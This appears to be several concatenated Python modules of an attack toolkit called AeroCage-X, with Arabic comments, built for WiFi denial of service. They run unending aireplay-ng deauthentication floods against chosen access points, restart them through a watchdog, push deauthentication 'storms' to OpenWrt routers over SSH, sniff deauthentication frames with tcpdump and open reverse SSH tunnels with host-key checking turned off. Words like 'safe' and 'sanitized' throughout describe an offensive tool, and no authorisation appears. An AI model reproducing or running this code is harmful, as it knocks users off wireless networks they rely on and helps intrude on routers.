# pylint: disable=import-error, wrong-import-position, no-name-in-module
from core.system_guard import SystemGuard
from modules.strike_manager import StrikeManagerEngine


class StrikeLauncher:
    """
    Main Strike Launcher Wrapper Object.
    Acts as an intermediary layer between UI triggers and back-end stream tasks.
    """

    def __init__(self):
        """تهيئة كائن الإطلاق والتحقق من الصلاحيات والاعتماديات الحتمية للنظام"""
        # تفعيل حارس صلاحيات الـ Root الفوري محلياً لحماية السكربت عند التهيئة الكائنية
        SystemGuard.enforce_root_privileges("Strike Launcher Mod")
        SystemGuard.verify_dependencies(["aireplay-ng"])
        self.manager = StrikeManagerEngine()

    def launch_strike_session(self, interface: str, target_bssid: str) -> bool:
        """تلقيم وإطلاق جلسة الفحص والمراقبة الآمنة عبر المدير المركزي المطور"""
        clean_inf = SystemGuard.sanitize_input(interface, "interface")
        clean_mac = SystemGuard.sanitize_input(target_bssid, "bssid").upper()

        if not clean_inf or not clean_mac:
            print("[-] Error: Refused to initialize execution parameters due to invalid inputs.")
            return False

        try:
            print("[*] Forwarding sanitized environment variables to core management engine...")
            success = self.manager.queue_and_launch_strike_safe(clean_inf, clean_mac)
            return success
        except (RuntimeError, AttributeError, OSError) as e:
            print(f"[-] Integrity Error: Sudden crash inside launcher wrapper thread: {e}")
            return False

    def stop_strike_session(self, target_bssid: str):
        """إيقاف الجلسة المحددة بالماك أدرس برمجياً وتطهير مسارات الذاكرة العشوائية"""
        clean_mac = SystemGuard.sanitize_input(target_bssid, "bssid").upper()
        if clean_mac:
            self.manager.abort_target_strike(clean_mac)


if __name__ == "__main__":
    launcher_instance = StrikeLauncher()

    # دعم التشغيل المباشر من سطر الأوامر بمدخلات مصفاة وآمنة تماماً
    if len(sys.argv) == 3:
        raw_inf = sys.argv[1]
        raw_mac = sys.argv[2]
        print("[+] Received local CLI argument parameters initialization vector.")
        launcher_instance.launch_strike_session(raw_inf, raw_mac)
    else:
        print("[*] Strike Launcher session utility module verified.")
        print("[*] Direct CLI Usage: python3 strike_launcher.py <interface> <bssid>")


#!/usr/bin/env python3
"""
File Name: strike_manager.py
Path: /home/kali/AeroCage-XV1.0.1/modules/strike_manager.py
Created Date: 2026-05-25
Version: 1.0.1
Description: Core Task Scheduling and Execution Manager for AeroCage-X.
             Integrates automated whitelist validation and task watchdog threads.
"""

import sys
import threading
from pathlib import Path

# ربط المسارات بالنواة المركزية والأنظمة المساعدة للمنظومة
BASE_DIR = Path(__file__).resolve().parent.parent
if str(BASE_DIR) not in sys.path:
    sys.path.append(str(BASE_DIR))

# pylint: disable=import-error, wrong-import-position, no-name-in-module
from core.system_guard import SystemGuard
from core.process_manager import ProcessManager
from modules.strike_whitelist import StrikeWhitelistEngine
from modules.strike_watchdog import StrikeWatchdogEngine


class StrikeManagerEngine:
    """
    Main Strike Task Controller.
    Manages centralized execution arrays, target queues, and task recovery.
    """

    def __init__(self):
        """تهيئة محرك الإدارة والتحقق من الصلاحيات وتفعيل خيط الحراسة المجدول"""
        # تفعيل صلاحيات الـ Root محلياً عند الاستدعاء
        SystemGuard.enforce_root_privileges("Strike Manager Engine")

        self.proc_manager = ProcessManager()
        self.whitelist_engine = StrikeWhitelistEngine()
        self.watchdog_engine = StrikeWatchdogEngine()
        self.lock = threading.Lock()
        self.active_attack_queue = set()

        # تشغيل محرك الحراسة التلقائي (Watchdog) لمراقبة استقرار المهام
        self.watchdog_engine.start_watchdog_loop_async(check_interval_sec=5)

    def queue_and_launch_strike_safe(self, interface: str, target_bssid: str) -> bool:
        """جدولة وتلقيم وإطلاق مهام المراقبة والفصل اللاسلكي بأمان مصفوفة كامل"""
        clean_inf = SystemGuard.sanitize_input(interface, "interface")
        clean_mac = SystemGuard.sanitize_input(target_bssid, "bssid").upper()

        if not clean_inf or not clean_mac:
            print("[-] Configuration Error: Invalid queue target parameters detected.")
            return False

        # التحقق الاستباقي من القائمة البيضاء لحماية الأصول اللاسلكية المعزولة
        if self.whitelist_engine.is_target_whitelisted(clean_mac):
            # تقسيم السطر للتوافق الصارم مع معايير طول السطر لـ PEP 8 لـ Pylint
            print(f"[🛡️ Protected] Execution aborted. MAC [{clean_mac}] is whitelisted!")
            return False

        with self.lock:
            if clean_mac in self.active_attack_queue:
                print(f"[-] System Notice: Target [{clean_mac}] is already in queue.")
                return False
            self.active_attack_queue.add(clean_mac)

        # بناء الأمر الآمن بالصيغة القياسية المعزولة الشل تماماً لـ Bandit
        command_array = ["aireplay-ng", "0", "0", "-a", clean_mac, clean_inf]

        try:
            print(f"[*] Queueing task handles against wireless host: {clean_mac}")

            # إطلاق المهمة عبر المدير لتفريغ البافر اللحظي وحماية موارد المعالج
            process = self.proc_manager.spawn_process_safe(clean_mac, command_array)

            if process:
                # تلقيم المعاملات لمحرك الحراسة للمتابعة والإنعاش الآلي عند الانقطاع
                self.watchdog_engine.register_target_for_monitoring(
                    clean_inf, clean_mac, command_array
                )
                return True

            with self.lock:
                self.active_attack_queue.discard(clean_mac)

        except (RuntimeError, AttributeError, OSError) as e:
            print(f"[-] Integrity Error: Unexpected crash during task queue dispatch: {e}")
            with self.lock:
                self.active_attack_queue.discard(clean_mac)
        return False

    def abort_target_strike(self, target_bssid: str):
        """إيقاف المهمة الموجهة وإلغاء حراستها وتطهير الذاكرة دون تداخل"""
        clean_mac = SystemGuard.sanitize_input(target_bssid, "bssid").upper()

        with self.lock:
            if clean_mac in self.active_attack_queue:
                self.active_attack_queue.discard(clean_mac)

        # سحب وتصفير المعرفات من كائن الحراسة وإخماد العملية من لينكس بدقة
        self.watchdog_engine.unregister_and_stop_target(clean_mac)
        print(f"[+] Task successfully cleared for target node: [{clean_mac}]")

    def shutdown_all_strikes(self):
        """إخماد كلي وشامل لكافة المهام وتفكيك طابور العمليات وتنظيف بيئة النظام"""
        print("\n[*] Initiating global shutdown sequence across active pipelines...")
        self.watchdog_engine.stop_watchdog_completely()

        with self.lock:
            for mac in list(self.active_attack_queue):
                self.proc_manager.terminate_process(mac)
            self.active_attack_queue.clear()
        print("[+] Global clean-up sequence completed. All tracking registers flushed cleanly.")


if __name__ == "__main__":
    print("[+] Strike Manager Engine module deployment configuration verified.")


#!/usr/bin/env python3
"""
File Name: strike_monitor.py
Path: /home/kali/AeroCage-XV1.0.1/modules/strike_monitor.py
Created Date: 2026-05-25
Version: 1.0.5
Description: Remote OpenWrt Dual Monitor Channels Management and Traffic Quality 
             Assurance Watchdog Engine for AeroCage-X. Fully integrated with toolkits.
"""

import threading

from core.system_guard import SystemGuard
from core.process_manager import ProcessManager
from utils.opwrt_ssh_factory import OpWrtSSHFactory
from utils.shared_utils_1 import SharedSecurityToolkit


class StrikeMonitorEngine:
    """
    Main Remote Monitor Interface Controller.
    Manages active wireless tracking cells and captures quality control telemetries.
    """

    def __init__(self, ap_ip: str, ap_password: str):
        """تهيئة محرك الرقابة العكسية وتأمين صلاحيات مدير النظام محلياً عبر النواة"""
        SystemGuard.enforce_root_privileges("Strike Monitor Remote OpenWrt Engine")

        self.proc_manager = ProcessManager()
        self.lock = threading.Lock()

        self.ap_ip = SharedSecurityToolkit.sanitize_input(ap_ip, "interface")
        self.ap_password = ap_password
        self.ssh_factory = OpWrtSSHFactory(ip=self.ap_ip, password=self.ap_password)

        # تخزن أسماء القنوات المزدوجة المنشأة داخل الراوتر
        self.remote_monitor_interfaces = []

    def setup_remote_dual_monitor_channels(self, ap_iface1: str, ap_iface2: str) -> bool:
        """إنشاء واجهتي مراقبة والتحقق الجراحي من نجاح العملية عتادياً بالراوتر"""
        clean_if1 = SharedSecurityToolkit.sanitize_input(ap_iface1, "interface")
        clean_if2 = SharedSecurityToolkit.sanitize_input(ap_iface2, "interface")

        if not clean_if1 or not clean_if2 or clean_if1 == clean_if2:
            print("[-] Configuration Error: Invalid or redundant interfaces provided.")
            return False

        print(f"[*] Provisioning dual monitoring channels inside target host: {self.ap_ip}")

        # تفتيت كتل نصوص الـ uci والـ iw وتوزيعها على أسطر قصيرة متوافقة 100% مع معايير PEP 8
        cmd_1 = (
            f"iw dev {clean_if1} interface add {clean_if1}mon type monitor && "
            f"ifconfig {clean_if1}mon up"
        )
        cmd_2 = (
            f"iw dev {clean_if2} interface add {clean_if2}mon type monitor && "
            f"ifconfig {clean_if2}mon up"
        )
        verify_cmd = f"iw dev {clean_if1}mon info && iw dev {clean_if2}mon info"

        try:
            self.ssh_factory.execute_remote_cmd(cmd_1)
            self.ssh_factory.execute_remote_cmd(cmd_2)

            check_stdout = self.ssh_factory.execute_remote_cmd(verify_cmd)

            if check_stdout and "type monitor" in check_stdout.lower():
                with self.lock:
                    self.remote_monitor_interfaces = [f"{clean_if1}mon", f"{clean_if2}mon"]
                msg_suc = f"[+] Remote validation success! Active: {self.remote_monitor_interfaces}"
                print(msg_suc)
                return True

            print("[-] Hardware Exception: OpenWrt host environment rejected monitor creation.")
            return False

        except (ValueError, KeyError, AttributeError, SystemError) as e:
            print(f"[-] Integrity Error: Exception inside remote environment provision: {e}")
            return False

    def start_remote_strike_monitoring_async(self, target_mac: str) -> bool:
        """إطلق مراقبة جودة الضربات حياً من داخل الراوتر دون حظر نظام كالي"""
        with self.lock:
            if len(self.remote_monitor_interfaces) < 2:
                print("[-] Error: Dual monitoring infrastructure has not been deployed yet.")
                return False
            # قنص العنصر النصي الأول حركياً لمنع تمرير كائن الـ List لـ tcpdump
            intel_iface = self.remote_monitor_interfaces[0]

        clean_target = SharedSecurityToolkit.sanitize_input(target_mac, "bssid")
        session_key = f"remote_mon_{clean_target}"

        remote_mon_cmd = f"tcpdump -i {intel_iface} -n 'wlan == 0xc0 and wlan addr1 {clean_target}'"

        full_command_array = self.ssh_factory.base_args + [remote_mon_cmd]

        try:
            print(f"[📡 Remote Monitor] Streaming runtime frame metrics for node: {clean_target}")
            self.proc_manager.spawn_process_safe(session_key, full_command_array)
            return True
        except (ValueError, KeyError, AttributeError, SystemError) as e:
            print(f"[-] Integrity Error: Stalled socket listener within channel context: {e}")
            return False

    def stop_remote_monitoring(self, target_mac: str):
        """قطع جلسة المراقبة البعيدة وتطهير الذاكرة لمنع العمليات المعلقة Zombie Processes"""
        clean_mac = SharedSecurityToolkit.sanitize_input(target_mac, "bssid")
        session_key = f"remote_mon_{clean_mac}"

        self.ssh_factory.execute_remote_cmd("killall tcpdump")

        self.proc_manager.terminate_process(session_key)
        print(f"[+] Successfully unmapped and flushed monitoring pipelines for: [{clean_mac}]")


if __name__ == "__main__":
    print("[+] Strike Watchdog Monitor Engine module configuration verified.")


#!/usr/bin/env python3
"""
File Name: strike_panel_ui.py
Path: /home/kali/AeroCage-XV1.0.1/modules/strike_panel_ui.py
Created Date: 2026-05-25
Version: 1.0.3
Description: Strike Panel GUI Adapter Module for AeroCage-X.
             Eliminates code redundancy by inheriting clean controller models.
"""

import tkinter as tk

from core.system_guard import SystemGuard
from core.ui_strike import AeroCageStrikeGUI


class AeroCageStrikePanelGUI(AeroCageStrikeGUI):
    """
    Lean Visual View Component.
    Acts as an entry point adapter for the secure operational strike subsystem.
    """

    def __init__(self, root: tk.Tk):
        """تهيئة الواجهة وتمرير المشيد المركزي لأب الـ UI والمصلح لغوياً"""
        SystemGuard.enforce_root_privileges("AeroCage Strike Panel GUI", graphical=True)
        super().__init__(root)


if __name__ == "__main__":
    root_window = tk.Tk()
    app = AeroCageStrikePanelGUI(root_window)
    root_window.mainloop()

#!/usr/bin/env python3
"""
File Name: strike_smart_fire.py
Path: /home/kali/AeroCage-XV1.0.1/modules/strike_smart_fire.py
Created Date: 2026-05-25
Version: 1.0.5
Description: Remote OpenWrt Targeted Deauthentication Exploit Delivery Engine.
             Optimized via centralized shared utility toolkits wrappers.
"""

import time
import threading

from core.system_guard import SystemGuard
from utils.opwrt_ssh_factory import OpWrtSSHFactory
from utils.shared_utils_1 import SharedSecurityToolkit
from utils.shared_utils_2 import SharedHardwarePulseVerifier


class StrikeSmartFireEngine:
    """
    Main Remote Exploit Delivery Component.
    Leverages central utility shards to validate and stream tactical injections.
    """

    def __init__(self, ap_ip: str, ap_password: str):
        """تهيئة محرك الحراسة والضرب الموجه وتأمين صلاحيات النظام محلياً"""
        SystemGuard.enforce_root_privileges("Strike Smart Fire Remote Engine")
        self.ssh_factory = OpWrtSSHFactory(ip=ap_ip, password=ap_password)
        self.lock = threading.Lock()

        # قاموس تتبع وحراسة الـ PIDs للأهداف داخل الراوتر البعيد
        self.active_remote_strikes = {}

    def launch_targeted_deauth_storm_safe(
        self, mon_iface: str, target_bssid: str, client_mac: str = None
    ) -> bool:
        """ضخ وإطلاق عاصفة قذف حزم الفصل الموجهة بالاعتماد على الحقائب المشتركة"""
        clean_mon = SharedSecurityToolkit.sanitize_input(mon_iface, "interface")
        clean_target = SharedSecurityToolkit.sanitize_input(target_bssid, "bssid").upper()

        if not clean_mon or not clean_target:
            print("[-] Configuration Error: Invalid interface or target bounds.")
            return False

        with self.lock:
            if clean_target in self.active_remote_strikes:
                print(f"[-] Alert: Node [{clean_target}] is already active.")
                return False

        # تفتيت وكسر أسطر صياغة وتلقيم المقذوف الشبكي للتوافق مع معيار الـ 100 حرف لـ Pylint
        gen_sh = SharedHardwarePulseVerifier.generate_sequential_attack_sh
        if client_mac:
            clean_client = SharedSecurityToolkit.sanitize_input(client_mac, "bssid").upper()
            attack_cmd = f"{gen_sh(clean_target, clean_mon)} -c {clean_client}"
        else:
            attack_cmd = gen_sh(clean_target, clean_mon)

        try:
            print(f"[*] [Smart Fire] Dispatching payload against: {clean_target}")

            # هندسة الـ PID الحقيقي المتولد دون تخمين عبر دمج التلقيم وقراءته فوراً بـ echo $!
            combined_cmd = f"nohup {attack_cmd} > /dev/null 2>&1 & echo $!"
            raw_pid_out = self.ssh_factory.execute_remote_cmd(combined_cmd)

            time.sleep(1)

            # التحقق الصارم من متانة المعرّف العائد من شل الراوتر البعيد
            if raw_pid_out and raw_pid_out.strip().isdigit():
                current_pid = raw_pid_out.strip()
                with self.lock:
                    self.active_remote_strikes[clean_target] = current_pid
                print(f"[+] Smart Fire Active🎯! Internal PID: {current_pid}")
                return True

            print("[-] Hardware Exception: Target core rejected exploit process spawn.")
            return False

        except (ValueError, KeyError, AttributeError, SystemError) as e:
            print(f"[-] Integrity Error: Exception inside pipeline context: {e}")
            return False

    def abort_specific_target_strike(self, target_bssid: str) -> bool:
        """كبح وإخماد الضربة الموجهة للهدف المحدد بالملي بالـ PID الداخلي"""
        clean_mac = SharedSecurityToolkit.sanitize_input(target_bssid, "bssid").upper()

        with self.lock:
            target_pid = self.active_remote_strikes.get(clean_mac)
            if not target_pid:
                print(f"[-] Notice: No active channels for target: {clean_mac}")
                return False

        print(f"[*] [UCI Kinetics] Sending kill to PID descriptor: {target_pid}")
        self.ssh_factory.execute_remote_cmd(f"kill -9 {target_pid}")

        with self.lock:
            if clean_mac in self.active_remote_strikes:
                del self.active_remote_strikes[clean_mac]

        print(f"[+] Successfully decoupled exploit handles for asset: [{clean_mac}]")
        return True


if __name__ == "__main__":
    print("[+] Strike Smart Fire Engine module configuration verified.")


#!/usr/bin/env python3
"""
File Name: strike_tunnel.py
Path: /home/kali/AeroCage-XV1.0.1/modules/strike_tunnel.py
Created Date: 2026-05-25
Version: 1.0.3
Description: Remote OpenWrt Secure Reverse SSH Tunneling Management Module.
             Monitors socket bindings and ensures clean port isolation matrix.
"""

import socket
import threading

from core.system_guard import SystemGuard
from core.process_manager import ProcessManager


class StrikeTunnelEngine:
    """
    Main Reverse Tunneling Controller Component.
    Deploys atomic reverse SSH tunnels and handles active background socket polling.
    """

    def __init__(self, ap_ip: str, ap_password: str):
        """تهيئة محرك الأنفاق العتادية وتأمين صلاحيات النظام محلياً"""
        SystemGuard.enforce_root_privileges("AeroCage-X Reverse Tunnel Engine")
        self.proc_manager = ProcessManager()
        self.lock = threading.Lock()

        self.ap_ip = SystemGuard.sanitize_input(ap_ip, "interface")
        self.ap_password = ap_password
        self.active_tunnels = {}

    @staticmethod
    def _is_local_port_busy(port: int) -> bool:
        """فحص داخلي ذكي للمنفذ محلياً لمنع تعارض وانهيار الأنفاق التتابعية"""
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            return s.connect_ex(('127.0.0.1', port)) == 0

    def establish_reverse_ssh_tunnel(self, local_port: int, remote_port: int) -> bool:
        """حفر وإنشاء نفق العبور العكسي بأمان مصفوفة مغلقة الشل ومحمية من التكرار"""
        if not str(local_port).isdigit() or not str(remote_port).isdigit():
            print("[-] Configuration Error: Port parameters must be absolute numeric digits.")
            return False

        tunnel_key = f"rev_tunnel_{remote_port}"

        # خط الدفاع الهيكلي لمحلي كالي: منع التضارب والـ Socket overlapping
        if self._is_local_port_busy(local_port):
            print(f"[-] Alert: Local port {local_port} is busy. Aborting double binding.")
            return False

        # تفتيت المصفوفة بشكل منسق للتوافق الصارم مع معيار الـ 100 حرف لـ Pylint
        bind_arg = f"{remote_port}:127.0.0.1:{local_port}"
        command_array = [
            "sshpass", "-p", self.ap_password,
            "ssh", "-N", "-R", bind_arg,
            "-o", "StrictHostKeyChecking=no", f"root@{self.ap_ip}"
        ]

        try:
            print(f"[*] [Tunnel Core] Mining reverse path to host: {self.ap_ip}")

            # ركوب نفق الـ Popen المستقر والمعزول مركزياً داخل محرك العمليات الموحد
            process = self.proc_manager.spawn_process_safe(tunnel_key, command_array)

            if process:
                with self.lock:
                    self.active_tunnels[tunnel_key] = process
                msg_suc = f"[+] Reverse tunnel locked (Local:{local_port} -> Remote:{remote_port})"
                print(msg_suc)
                return True
            return False

        except (ValueError, KeyError, AttributeError, SystemError) as e:
            print(f"[-] Integrity Error: Exception inside socket tunneling allocation: {e}")
            return False

    def close_tunnel_bridge(self, remote_port: int):
        """إغلاق النفق المخصص برمجياً بالـ PID اللحظي وتطهير المنفذ لمنع الـ Port Busy"""
        tunnel_key = f"rev_tunnel_{remote_port}"
        with self.lock:
            if tunnel_key in self.active_tunnels:
                # إنهاء محدد ونظيف وموثق للعملية لمنع بقاء السوكيت كـ Zombie في كالي
                self.proc_manager.terminate_process(tunnel_key)
                del self.active_tunnels[tunnel_key]
                print(f"[+] Successfully destroyed tunnel context: [{tunnel_key}]")
            else:
                print(f"[-] Notice: No active channels allocated for port: {remote_port}")


if __name__ == "__main__":
    print("[+] Strike Reverse Tunnel Engine module configuration verified.")


#!/usr/bin/env python3
"""
File Name: strike_watchdog.py
Path: /home/kali/AeroCage-XV1.0.1/modules/strike_watchdog.py
Created Date: 2026-05-25
Version: 1.0.3
Description: Fault Recovery and Daemon Health Watchdog Pool Engine for AeroCage-X.
             Optimized via centralized shared utility toolkits wrappers.
"""

import time
import threading

from core.system_guard import SystemGuard
from core.process_manager import ProcessManager
from utils.shared_utils_1 import SharedSecurityToolkit


class StrikeWatchdogEngine:
    """
    Main Task Watchdog Controller.
    Monitors process liveness and dynamically redeploys stalled tracking streams.
    """

    def __init__(self):
        """تهيئة محرك الحراسة وتأمين صلاحيات النظام محلياً ومنع الـ Dead-locks"""
        SystemGuard.enforce_root_privileges("Strike Watchdog Engine")

        self.proc_manager = ProcessManager()
        self.watchdog_active = False
        self.monitored_targets = {}
        self.lock = threading.Lock()

    def register_target_for_monitoring(
        self, interface: str, target_bssid: str, command_array: list
    ):
        """تسجيل وتلقيم هدف جديد في طابور الحراسة والمراقبة المستمرة"""
        clean_inf = SharedSecurityToolkit.sanitize_input(interface, "interface")
        clean_mac = SharedSecurityToolkit.sanitize_input(target_bssid, "bssid")

        if not clean_inf or not clean_mac or not command_array:
            return

        with self.lock:
            target_key = f"{clean_inf}_{clean_mac}"
            self.monitored_targets[target_key] = {
                "interface": clean_inf,
                "bssid": clean_mac,
                "command": command_array
            }
            msg_reg = f"[+] Successfully registered target node [{clean_mac}]"
            print(f"{msg_reg} inside watchdog queue.")

    def start_watchdog_loop_async(self, check_interval_sec: int = 5):
        """إطلاق محرك الحراسة والرقابة في الخلفية بأمان عالي ودون حظر المنظومة"""
        if self.watchdog_active:
            return

        self.watchdog_active = True
        worker_thread = threading.Thread(
            target=self._watchdog_core_worker,
            args=(check_interval_sec,),
            daemon=True
        )
        worker_thread.start()
        print("[*] Strike Watchdog supervisor loop successfully activated.")

    def _watchdog_core_worker(self, interval: int):
        """العامل الخلفي المعزول لفحص حالة المكونات وإعادة إنعاشها برمجياً بأمان"""
        while self.watchdog_active:
            try:
                with self.lock:
                    current_queue = list(self.monitored_targets.values())

                for info in current_queue:
                    mac = info["bssid"]
                    cmd_array = info["command"]

                    process = self.proc_manager.active_processes.get(mac)

                    if process is None or process.poll() is not None:
                        print(f"[⚠️] Watchdog Alert: Broken daemon handle for [{mac}].")
                        print("[*] Initiating automated hot-recovery deployment...")

                        self.proc_manager.terminate_process(mac)
                        self.proc_manager.spawn_process_safe(mac, cmd_array)

                time.sleep(interval)

            except (RuntimeError, ValueError, AttributeError, SystemError) as e:
                print(f"[-] Integrity Error inside core watchdog loop: {e}")
                time.sleep(interval)

    def unregister_and_stop_target(self, target_bssid: str):
        """حذف الهدف من طابور الحراسة وإخماد عمليته نهائياً وتصفير ممراته"""
        clean_mac = SharedSecurityToolkit.sanitize_input(target_bssid, "bssid")

        with self.lock:
            keys_to_remove = [
                k for k, v in self.monitored_targets.items() if v["bssid"] == clean_mac
            ]
            for k in keys_to_remove:
                del self.monitored_targets[k]

        self.proc_manager.terminate_process(clean_mac)
        msg_out = f"[+] Successfully unallocated tracking registers for: [{clean_mac}]"
        print(msg_out)

    def stop_watchdog_completely(self):
        """إيقاف محرك الكلب الحارس بالكامل وتطهير الذاكرة"""
        self.watchdog_active = False
        with self.lock:
            self.monitored_targets.clear()
        print("[+] Core Watchdog deallocated. Monitoring queues flushed cleanly.")


if __name__ == "__main__":
    print("[+] Strike Watchdog Engine module deployment configuration verified.")


